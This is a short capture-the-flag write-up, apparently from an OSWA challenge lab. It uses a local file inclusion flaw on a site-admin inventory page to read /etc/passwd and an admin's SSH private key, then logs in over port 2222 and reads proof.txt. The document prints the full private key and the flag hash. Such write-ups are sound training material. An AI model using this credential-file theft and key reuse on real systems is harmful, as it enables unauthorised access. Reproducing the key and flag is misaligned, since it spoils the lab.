```bash
http://piano_protocol/siteadmin/dev
```
![[Pasted image 20241125132521.png]]
we know we have to use `SSH`
![[Pasted image 20241125132806.png]]
selecting the `PIANO` from the inventory on the `siteadmin/dev` page and hitting check inventory displays a `LFI` method
![[Pasted image 20241125135713.png]]
checking for `/etc/passwd` we get results
![[Pasted image 20241125135855.png]]
knowing that `ssh` is being utilized on port `2222` we can focus on getting an `ssh id_rsa` key
we get the `ssh` key
![[Pasted image 20241125140009.png]]
```bash
-----BEGIN OPENSSH PRIVATE KEY-----
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
-----END OPENSSH PRIVATE KEY-----
```
save file to `admin_rsa` change permissions to `chmod 600` and profit `proof.txt`

```bash
┌──(root💀gobots)-[25Nov2024 18:44:37]-[/home/…/SUT/OSWA/challenge_labs/piano_protocol]
└─# vim admin_rsa     
┌──(root💀gobots)-[25Nov2024 18:44:48]-[/home/…/SUT/OSWA/challenge_labs/piano_protocol]
└─# ssh -p 2222 -i admin_rsa admin@192.168.240.126
@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@
@         WARNING: UNPROTECTED PRIVATE KEY FILE!          @
@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@
Permissions 0644 for 'admin_rsa' are too open.
It is required that your private key files are NOT accessible by others.
This private key will be ignored.
Load key "admin_rsa": bad permissions
(admin@192.168.240.126) Password: 

          
┌──(root💀gobots)-[25Nov2024 18:45:13]-[/home/…/SUT/OSWA/challenge_labs/piano_protocol]
└─# chmod 600 admin_rsa  

┌──(root💀gobots)-[25Nov2024 18:45:36]-[/home/…/SUT/OSWA/challenge_labs/piano_protocol]
└─# ssh -p 2222 -i admin_rsa admin@192.168.240.126
Linux 4640f8a33883 5.15.0-75-generic #82-Ubuntu SMP Tue Jun 6 23:10:23 UTC 2023 x86_64

The programs included with the Debian GNU/Linux system are free software;
the exact distribution terms for each program are described in the
individual files in /usr/share/doc/*/copyright.

Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent
permitted by applicable law.
admin@4640f8a33883:~$ whoami
admin
admin@4640f8a33883:~$ ls
proof.txt
admin@4640f8a33883:~$ cat proof.txt 
bedf234a5324136b019859e0c79a635a
admin@4640f8a33883:~$ 

```

![[Pasted image 20241125140119.png]]